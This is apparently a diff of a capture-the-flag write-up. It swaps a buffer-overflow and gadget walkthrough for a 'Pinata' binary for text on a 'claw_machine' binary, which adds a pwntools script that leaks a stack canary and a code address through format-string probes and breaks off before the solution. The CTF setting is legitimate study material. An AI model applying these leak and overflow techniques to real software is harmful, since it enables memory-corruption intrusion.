@@ -124,111 +124,63 @@ unsigned __int64 fb()
   return __readfsqword(0x28u) ^ v7;
 }
 ```
+Lets attempt to overflow the buffer:
 
-```gdb
-pwndbg> cyclic 200
-aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
-pwndbg> r
-Starting program: /home/w3th4nds/github/australia/pwn/[Easy] Pinata/challenge/pinata 
-██████████████████████████████████
-        █
-        █
-        █
-        █
-        █       ████
-        █      ██████
-        █      ██ ██
- ████████████████
-███████████████▬ 
-  █████████████
-  ██ ██  ██ ██
-  ██ ██  ██ ██
+```console
+Enter your name: no
 
-Scream as much as you can to break the pinata!!
+Thank you for giving feedback no
 
->> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+Leave your feedback here: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
-Program received signal SIGSEGV, Segmentation fault.
-0x0000000000401889 in reader ()
-LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
-─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────
-*RAX  0x7fffffffde00 ◂— 0x6161616161616161 ('aaaaaaaa')
-*RBX  0x7fffffffe018 —▸ 0x7fffffffe395 ◂— 'SHELL=/bin/bash'
-*RCX  0x4c6440 (_IO_2_1_stdin_) ◂— 0xfbad208b
-*RDX  0x1
-*RDI  0x4c90e0 (_IO_stdfile_0_lock) ◂— 0x0
-*RSI  0x1
- R8   0x0
- R9   0x0
-*R10  0x80
-*R11  0x246
-*R12  0x1
-*R13  0x7fffffffe008 —▸ 0x7fffffffe352 ◂— '/home/w3th4nds/github/australia/pwn/[Easy] Pinata/challenge/pinata'
-*R14  0x4c26f0 (__preinit_array_start) —▸ 0x401780 (frame_dummy) ◂— endbr64 
-*R15  0x1
-*RBP  0x6161616161616163 ('caaaaaaa')
-*RSP  0x7fffffffde18 ◂— 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
-*RIP  0x401889 (reader+30) ◂— ret 
-──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────
- ► 0x401889 <reader+30>    ret    <0x6161616161616164>
+Thank you for playing!
 
-
-
-
-
-
-
-
-
-
-────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
-00:0000│ rsp 0x7fffffffde18 ◂— 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
-01:0008│     0x7fffffffde20 ◂— 'eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
-02:0010│     0x7fffffffde28 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
-03:0018│     0x7fffffffde30 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
-04:0020│     0x7fffffffde38 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
-05:0028│     0x7fffffffde40 ◂— 'iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
-06:0030│     0x7fffffffde48 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
-07:0038│     0x7fffffffde50 ◂— 'kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
-──────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
- ► f 0         0x401889 reader+30
-   f 1 0x6161616161616164
-   f 2 0x6161616161616165
-   f 3 0x6161616161616166
-   f 4 0x6161616161616167
-   f 5 0x6161616161616168
-   f 6 0x6161616161616169
-   f 7 0x616161616161616a
-   ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-pwndbg> cyclic -o daaaaaaa
-Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
-Found at offset 24
+*** stack smashing detected ***: <unknown> terminated
+zsh: IOT instruction (core dumped)  ./claw_machine
 ```
+Shit. Canaries :)
 
-Instead, we overwrote the return address at `24` bytes. So, we have control of `rip`, `PIE` is off, so we can easily perform a `ret2libc` attack, right? Wrong!
-
-The reason is that the binary is statically linked, meaning there is no record of `system` or other function in `GOT` because everything is already in the binary.
+Also did some testing "Off camera" and found out that you have 72 bytes before hitting the canary :)
 
 ### Debugging 
 
-As we noticed before, `NX` is disabled, meaning we can execute code. We will take advantage of this and the lack of `PIE` and `Canary` to ROP our way around.
+Ok, time to go hunt for some canaries
+In linux canaries end in 00. This makes them pretty easy to spot. to figure out which values correspond to a canary i used a quick python script:
+```python
+from pwn import *
 
-First of all, we need to find some useful gadgets.
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF('./claw_machine', checksec=False)
 
-```console
-➜  challenge git:(main) ✗ ropper -f ./pinata --search "jmp rax"
-[INFO] Load gadgets from cache
-[LOAD] loading... 100%
-[LOAD] removing double gadgets... 100%
-[INFO] Searching for gadgets: jmp rax
-
-[INFO] File: ./pinata
-0x00000000004016ec: jmp rax;
+# Let's fuzz x values
+for i in range(300):
+    try:
+        if True:
+            # Create process (level used to reduce noise)
+            p = process(level='error')
+            p.recvuntil(b">> ")
+            p.sendline(b'9')
+            p.recvuntil(b">> ")
+            p.sendline(b'y')
+            p.recvuntil(b': ')
+            p.sendline('%{}$p'.format(i).encode())
+            p.recvline()
+            result = p.recvline().decode()
+            if result:
+                print(str(i) + ': ' + str(result[result.index("k",20)+1:]).strip()) #i know this is made badly... Leave me alone.
+    except EOFError:
+        pass
+#  Canaries will look like this:
+#  0x5020c933db88ab00
+#  0x459415b8e048d00
+#  makes em really easy to see
 ```
+after running this script a couple times i managed to not only find that a canary sits on the 21st value on the stack (%21$p) but also that we have the address of Main+53 at the 23rd value on the stack (%23$p)
+the address of main+53 is on the stack due to it being the return value after fd is done :)
 
-This gadget is extremely handy to return where we have written.
+Since we know that the return value is sits 2 spots after the canary we know that our payload should look something like this:
 
-Another useful "gadget" is the `jmp esp` opcode. We will combine these 2 to write to `rax`, jump there and then jump to `esp` to execute our shellcode.
+Overflow
 
 # Solution
 
